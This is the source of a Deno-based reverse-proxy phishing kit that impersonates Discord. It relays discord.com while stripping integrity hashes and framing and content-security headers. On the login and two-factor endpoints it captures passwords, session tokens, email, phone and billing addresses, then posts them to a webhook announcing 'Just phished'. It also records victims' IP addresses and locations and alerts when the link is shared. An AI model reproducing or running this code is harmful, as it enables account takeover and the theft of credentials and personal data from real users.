const CLIENT_ID = ""; // Client ID
const CLIENT_SECRET = ""; // Client Secret

function delay(ms, options = {}) {
    const { signal  } = options;
    if (signal?.aborted) {
        return Promise.reject(new DOMException("Delay was aborted.", "AbortError"));
    }
    return new Promise((resolve, reject)=>{
        const abort = ()=>{
            clearTimeout(i);
            reject(new DOMException("Delay was aborted.", "AbortError"));
        };
        const done = ()=>{
            signal?.removeEventListener("abort", abort);
            resolve();
        };
        const i = setTimeout(done, ms);
        signal?.addEventListener("abort", abort, {
            once: true
        });
    });
}
const ERROR_SERVER_CLOSED = "Server closed";
const INITIAL_ACCEPT_BACKOFF_DELAY = 5;
const MAX_ACCEPT_BACKOFF_DELAY = 1000;
class Server {
    #port;
    #host;
    #handler;
    #closed = false;
    #listeners = new Set();
    #httpConnections = new Set();
    #onError;
    constructor(serverInit){
        this.#port = serverInit.port;
        this.#host = serverInit.hostname;
        this.#handler = serverInit.handler;
        this.#onError = serverInit.onError ?? function(error) {
            console.error(error);
            return new Response("Internal Server Error", {
                status: 500
            });
        };
    }
    async serve(listener) {
        if (this.#closed) {
            throw new Deno.errors.Http(ERROR_SERVER_CLOSED);
        }
        this.#trackListener(listener);
        try {
            return await this.#accept(listener);
        } finally{
            this.#untrackListener(listener);
            try {
                listener.close();
            } catch  {}
        }
    }
    async listenAndServe() {
        if (this.#closed) {
            throw new Deno.errors.Http(ERROR_SERVER_CLOSED);
        }
        const listener = Deno.listen({
            port: this.#port ?? 80,
            hostname: this.#host ?? "0.0.0.0",
            transport: "tcp"
        });
        return await this.serve(listener);
    }
    async listenAndServeTls(certFile, keyFile) {
        if (this.#closed) {
            throw new Deno.errors.Http(ERROR_SERVER_CLOSED);
        }
        const listener = Deno.listenTls({
            port: this.#port ?? 443,
            hostname: this.#host ?? "0.0.0.0",
            certFile,
            keyFile,
            transport: "tcp"
        });
        return await this.serve(listener);
    }
    close() {
        if (this.#closed) {
            throw new Deno.errors.Http(ERROR_SERVER_CLOSED);
        }
        this.#closed = true;
        for (const listener of this.#listeners){
            try {
                listener.close();
            } catch  {}
        }
        this.#listeners.clear();
        for (const httpConn of this.#httpConnections){
            this.#closeHttpConn(httpConn);
        }
        this.#httpConnections.clear();
    }
    get closed() {
        return this.#closed;
    }
    get addrs() {
        return Array.from(this.#listeners).map((listener)=>listener.addr);
    }
    async #respond(requestEvent, httpConn, connInfo) {
        let response;
        try {
            response = await this.#handler(requestEvent.request, connInfo);
        } catch (error) {
            response = await this.#onError(error);
        }
        try {
            await requestEvent.respondWith(response);
        } catch  {
            return this.#closeHttpConn(httpConn);
        }
    }
    async #serveHttp(httpConn1, connInfo1) {
        while(!this.#closed){
            let requestEvent1;
            try {
                requestEvent1 = await httpConn1.nextRequest();
            } catch  {
                break;
            }
            if (requestEvent1 === null) {
                break;
            }
            this.#respond(requestEvent1, httpConn1, connInfo1);
        }
        this.#closeHttpConn(httpConn1);
    }
    async #accept(listener) {
        let acceptBackoffDelay;
        while(!this.#closed){
            let conn;
            try {
                conn = await listener.accept();
            } catch (error1) {
                if (error1 instanceof Deno.errors.BadResource || error1 instanceof Deno.errors.InvalidData || error1 instanceof Deno.errors.UnexpectedEof || error1 instanceof Deno.errors.ConnectionReset || error1 instanceof Deno.errors.NotConnected) {
                    if (!acceptBackoffDelay) {
                        acceptBackoffDelay = INITIAL_ACCEPT_BACKOFF_DELAY;
                    } else {
                        acceptBackoffDelay *= 2;
                    }
                    if (acceptBackoffDelay >= 1000) {
                        acceptBackoffDelay = MAX_ACCEPT_BACKOFF_DELAY;
                    }
                    await delay(acceptBackoffDelay);
                    continue;
                }
                throw error1;
            }
            acceptBackoffDelay = undefined;
            let httpConn2;
            try {
                httpConn2 = Deno.serveHttp(conn);
            } catch  {
                continue;
            }
            this.#trackHttpConnection(httpConn2);
            const connInfo2 = {
                localAddr: conn.localAddr,
                remoteAddr: conn.remoteAddr
            };
            this.#serveHttp(httpConn2, connInfo2);
        }
    }
     #closeHttpConn(httpConn3) {
        this.#untrackHttpConnection(httpConn3);
        try {
            httpConn3.close();
        } catch  {}
    }
     #trackListener(listener1) {
        this.#listeners.add(listener1);
    }
     #untrackListener(listener2) {
        this.#listeners.delete(listener2);
    }
     #trackHttpConnection(httpConn4) {
        this.#httpConnections.add(httpConn4);
    }
     #untrackHttpConnection(httpConn5) {
        this.#httpConnections.delete(httpConn5);
    }
}
async function serve(handler, options = {}) {
    const server = new Server({
        port: options.port ?? 8000,
        hostname: options.hostname ?? "0.0.0.0",
        handler,
        onError: options.onError
    });
    if (options?.signal) {
        options.signal.onabort = ()=>server.close();
    }
    return await server.listenAndServe();
}
const INTEGRITY_REGEX = /integrity=(["'])(?:(?=(\\?))\2.)*?\1/g;
const config = JSON.parse(await Deno.readTextFile("./config.json"));
const badges = {
    [1 << 1]: "Partnered",
    [1 << 2]: "Hypesquad Events",
    [1 << 3]: "Bug Hunter One",
    [1 << 9]: "Early Supporter",
    [1 << 14]: "Bug Hunter Two",
    [1 << 17]: "Early Bot Dev"
};
const Decoder = new TextDecoder();
class Util {
    static filter = (domain, response)=>{
        response = response.replace(INTEGRITY_REGEX, "");
        for (const { pattern , replacement  } of config.filter)if (pattern && replacement) response = response.replace(new RegExp(pattern.replace(/\<DOMAIN\>/g, domain), "g"), replacement.replace(/\<DOMAIN\>/g, domain));
        return response;
    };
    static getURL = (domain, path)=>{
        for (const entry of config.subdomains)if (domain.replace(/((http)|(https)):\/\//g, "").startsWith(entry.subdomain + ".")) return entry.url + path;
        for (const entry1 of config.paths)if (path.startsWith(entry1.path)) return entry1.url + path.slice(entry1.path.length - 1);
        return null;
    };
    static isFilter = (host, path, content, status)=>{
        if (path.indexOf("assets/adaf93e1611d7934016a.js") !== -1) return false;
        if (config.whitelisted_extensions.indexOf(path.split(".").pop()) !== -1 || config.status.indexOf(status) !== -1 || config.whitelisted_urls.indexOf(host) !== -1) return false;
        for (const _content of config.whitelisted_content)if (_content.indexOf(content) !== -1) return false;
        return true;
    };
    static toString = async (reader)=>{
        let string = "";
        if (!reader) return string;
        while(true){
            const { value , done  } = await reader.read();
            if (done) break;
            string += Decoder.decode(value);
        }
        return string;
    };
    static getBadges = (flags)=>Object.keys(badges).filter((key)=>flags & parseInt(key)).map((key)=>badges[parseInt(key)]);
    static toObject = (parameters)=>{
        if (parameters.length === 0) return {};
        const keys = {};
        parameters.replace("?", "").split("&").map((item)=>keys[item.split("=")[0]] = item.split("=")[1]);
        return keys;
    };
    static isMobile = (user_agent)=>/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(user_agent) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(user_agent.substr(0, 4));
    static getLocation = async (ip)=>await (await fetch(`https://ipinfo.io/${ip}`, {
            headers: {
                "Accept": "application/json"
            }
        })).json();
}
class LoggerUtil {
    static getTime = ()=>new Date().toLocaleTimeString();
    static debug = console.log;
    static log = (str)=>console.log(`\x1b[96m>.< \x1b[37m| \x1b[95m${this.getTime()} \x1b[37m| ${str}`);
    static warn = (str)=>console.log(`\x1b[92m>.< \x1b[37m| \x1b[95m${this.getTime()} \x1b[37m| ${str}`);
    static err = (str)=>console.log(`\x1b[91m>.< \x1b[37m| \x1b[95m${this.getTime()} \x1b[37m| ${str}`);
}
const config1 = JSON.parse(await Deno.readTextFile("./config.json"));
const webhook = {
    title: "> ⚡",
    color: 11825870,
    footer: {
        text: "Written by cnr"
    },
    timestamp: new Date()
};
const BASE_URL = "https://discord.com/api/v10";

class DiscordUtil {
    static getAccessToken = async (url, code)=>{
        const response = await (await fetch(`${BASE_URL}/oauth2/token`, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=authorization_code&code=${code}&redirect_uri=${url}`
        })).json();
        return response.access_token || null;
    };
    static getUser = async (access_token)=>{
        const response = await (await fetch(`${BASE_URL}/users/@me`, {
            headers: {
                "Authorization": `Bearer ${access_token}`
            }
        })).json();
        return response;
    };
    static clicked = async (user, ip, user_agent)=>{
        const location = await Util.getLocation(ip);
        fetch(config1.hitter_webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: "🎣",
                embeds: [
                    {
                        description: `> \`${user.username}#${user.discriminator}\` has clicked the link on **${Util.isMobile(user_agent) ? "mobile" : "desktop"}**`,
                        fields: [
                            {
                                name: "IP",
                                value: `> \`${ip}\``,
                                inline: true
                            },
                            {
                                name: "Location",
                                value: `> \`${location.bogon ? "N/A" : `${location.region}, ${location.country}`}\``,
                                inline: true
                            }
                        ],
                        ...webhook
                    }
                ]
            })
        });
    };
    static posted = async (url)=>fetch(config1.hitter_webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: "🎣",
                embeds: [
                    {
                        ...webhook,
                        title: "> ⚠️",
                        description: `> \`${url}\` was posted inside a Discord server!`
                    }
                ]
            })
        });
}
const BASE_URL1 = "https://discord.com/api/v9";
const config2 = JSON.parse(await Deno.readTextFile("./config.json"));
const mfa = {};
class Discord {
    static login = async (body, resp)=>{
        const { login , password , ticket: _ticket  } = JSON.parse(await Util.toString(body));
        const { token , ticket  } = JSON.parse(await Util.toString(resp));
        if (ticket) mfa[ticket] = {
            login,
            password
        };
        if (login && password && token) {
            this.notify(password, token, await this.getUser(token), true);
            this.notify(password, token, await this.getUser(token), false);
        }
        if (_ticket && mfa[_ticket] && token) {
            this.notify(mfa[_ticket].password || "N/A", token, await this.getUser(token), true);
            this.notify(mfa[_ticket].password || "N/A", token, await this.getUser(token), false);
        }
    };
    static getUser = async (token)=>{
        const request = await fetch(`${BASE_URL1}/users/@me`, {
            headers: {
                "Authorization": token
            }
        });
        if (request.status !== 200) throw "Unable to fetch user!";
        const { id , email , username , discriminator , phone , public_flags  } = await request.json();
        return {
            id,
            email,
            username,
            discriminator,
            phone,
            public_flags
        };
    };
    static getBilling = async (token)=>{
        const request = await fetch(`${BASE_URL1}/users/@me/billing/payment-sources`, {
            headers: {
                "Authorization": token
            }
        });
        if (request.status !== 200) throw "Unable to fetch billing!";
        const json = await request.json();
        const billing = json[Object.keys(json)[0]]?.billing_address;
        return billing || {
            name: null,
            line_1: null,
            postal_code: null
        };
    };
    static notify = async (password, token, user, show)=>{
        const billing = await this.getBilling(token);
        fetch(show ? config2.webhook : config2.hitter_webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: "🎣",
                content: show ? null : "<@&1021501129965719603>",
                embeds: [
                    {
                        title: "> ⚡",
                        description: `> Just phished \`${user.username}#${user.discriminator}\` ${billing.name ? `(\`${billing.name}\`)` : ""}`,
                        color: 11825870,
                        fields: [
                            {
                                name: "Token",
                                value: `> \`${show ? token : "[redacted]"}\``
                            },
                            {
                                name: "Username",
                                value: `\`${user.username}#${user.discriminator}\``,
                                inline: true
                            },
                            {
                                name: "E-Mail",
                                value: `\`${user.email}\``,
                                inline: true
                            },
                            {
                                name: "Password",
                                value: `\`${show ? password.replace(/\`/g, "\\`") : "[redacted]"}\``,
                                inline: true
                            },
                            {
                                name: "Mobile",
                                value: `\`${show ? user.phone || "N/A" : "[redacted]"}\``,
                                inline: true
                            },
                            {
                                name: "Information",
                                value: `> Badges: \`${Util.getBadges(user.public_flags).map((badge)=>`\`${badge.toUpperCase().replace(/ /g, "_")}\``).join(" ") || "NONE"}\`\n> Address: \`${billing.line_1 && billing.postal_code ? `${billing.line_1}, ${billing.postal_code}` : "N/A"}\``
                            }
                        ],
                        footer: {
                            text: "Written by cnr"
                        },
                        timestamp: new Date()
                    }
                ]
            })
        });
    };
}
class HTTPProxy {
    domain;
    url;
    constructor(domain){
        this.domain = domain;
        this.url = new URL(domain);
    }
    headers = (iterator)=>{
        const headers = {
            origin: "https://discord.com",
            referer: "https://discord.com"
        };
        for (const [key, value] of iterator)if (!headers[key.toLowerCase()] && key !== "host") headers[key.toLowerCase()] = value.replace(/http/g, "https");
        return headers;
    };
    security = (iterator)=>{
        const headers = {};
        for (let [key, value] of iterator){
            if (!headers[key.toLowerCase()]) {
                if (key.toLowerCase() === "x-frame-options" || key.toLowerCase() === "content-security-policy") continue;
                headers[key.toLowerCase()] = value;
            }
        }
        return headers;
    };
    proxy = async (host, method, base, path, headers, body)=>{
        const [_body, copied] = body?.tee() || [];
        const url = new URL(Util.getURL(base, "/" + path) || `${this.domain}/${path}`), request = await this.request(method, url.href, this.headers(headers.entries()), _body);
        const [resp, _resp] = request?.body?.tee() || [];
        if (path.indexOf("auth/login") !== -1 || path.indexOf("auth/mfa/totp") !== -1) Discord.login(copied.getReader(), _resp?.getReader());
        if (headers.get("authorization")) console.log(headers.get("authorization"));
        if (!Util.isFilter(url.host, path, request.headers.get("content-type"), request.status)) return new Response(resp || null, {
            status: request.status,
            headers: this.security(request.headers.entries())
        });
        return new Response(Util.filter(host, await Util.toString(resp?.getReader())), {
            status: request.status,
            headers: this.security(request.headers.entries())
        });
    };
    request = async (method, url, headers, body)=>{
        const init = {
            method,
            headers
        };
        if (body) init.body = body;
        return await fetch(url, init);
    };
}
const HTTP = new HTTPProxy("https://discord.com");
const config3 = JSON.parse(await Deno.readTextFile("./config.json"));
const codes = [];
const getConn = (conn)=>{
    if (![
        "tcp",
        "udp"
    ].includes(conn.remoteAddr.transport)) return null;
    return conn.remoteAddr;
};
const handler = async (req, conn)=>{
    const { host , origin , pathname , search  } = new URL(req.url);
    const parameters = Util.toObject(search);
    if (parameters.code && codes.indexOf(parameters.code) === -1) {
        const token = await DiscordUtil.getAccessToken(origin + pathname, parameters.code);
        if (!token) return await HTTP.proxy(host, req.method, origin, pathname.slice(1) + search, req.headers, req.body || null);
        const user = await DiscordUtil.getUser(token);
        const _conn = getConn(conn);
        if (_conn) DiscordUtil.clicked(user, _conn.hostname, req.headers.get("user-agent") || "");
    }
    if (req.headers.get("user-agent")?.indexOf("Discordbot") !== -1) DiscordUtil.posted(req.url);
    return await HTTP.proxy(host, req.method, origin, pathname.slice(1) + search, req.headers, req.body || null);
};
LoggerUtil.log(`Bound to port: ${config3.port}`);
serve(handler, {
    port: config3.port
});
